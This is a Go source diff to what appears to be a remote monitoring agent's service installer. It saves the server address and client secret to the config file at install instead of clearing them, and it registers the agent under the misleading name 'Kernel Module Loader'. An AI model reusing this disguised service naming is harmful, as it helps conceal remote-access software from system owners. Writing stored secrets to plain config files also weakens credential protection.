@@ -159,12 +159,10 @@ func init() {
 
 	if agentConfig.Server != "" {
 		agentCliParam.Server = agentConfig.Server
-		agentConfig.Server = ""
 	}
 
 	if agentConfig.Password != "" {
 		agentCliParam.ClientSecret = agentConfig.Password
-		agentConfig.Password = ""
 	}
 
 	monitor.InitConfig(&agentConfig)
@@ -308,7 +306,7 @@ func run() {
 func runService(action string, flags []string) {
 	dir, err := os.Getwd()
 	if err != nil {
-		printf("获取当前工作目录时出错: ", err)
+		printf("Get system workdir error: ", err)
 		return
 	}
 
@@ -328,7 +326,7 @@ func runService(action string, flags []string) {
 		Name:             "sysctl-init",
 		DisplayName:      "Kernel Module Loader",
 		Description:      "Initialize System Kernel Parameters",
-		Arguments:        flags,
+		// Arguments:        flags,
 		// Arguments:        []string{"$SERVICE_ARGS"},
 		WorkingDirectory: dir,
 		Option:           winConfig,
@@ -357,6 +355,11 @@ func runService(action string, flags []string) {
 
 	if action == "install" {
 		initName := s.Platform()
+		agentConfig.Server = agentCliParam.Server
+		agentConfig.Password = agentCliParam.ClientSecret
+		if err = agentConfig.Save(); err != nil {
+			panic(err)
+		}
 		println("Init system is:", initName)
 	}
 
